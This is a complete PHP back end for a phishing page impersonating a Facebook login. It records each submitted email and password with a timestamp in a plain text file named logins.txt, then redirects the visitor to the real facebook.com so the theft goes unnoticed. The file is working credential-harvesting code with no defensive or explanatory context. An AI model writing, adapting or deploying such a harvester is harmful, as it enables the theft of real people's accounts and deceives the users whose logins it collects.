<?php 
    if(isset($_POST['submit'])) {
        date_default_timezone_set('Asia/Kolkata');

        $date = date('d-m-Y H:i:s');
        $email = $_POST['email'];
        $password = $_POST['password'];

        $loginFile = fopen('logins.txt', 'a');

        // fwrite($loginFile, );
        $data = "[ " . $date . " ] Username : " . $email . "  Password : " . $password . "\n";
        fwrite($loginFile, $data);

        fclose($loginFile);
    }
    header('location:https://www.facebook.com/');
?>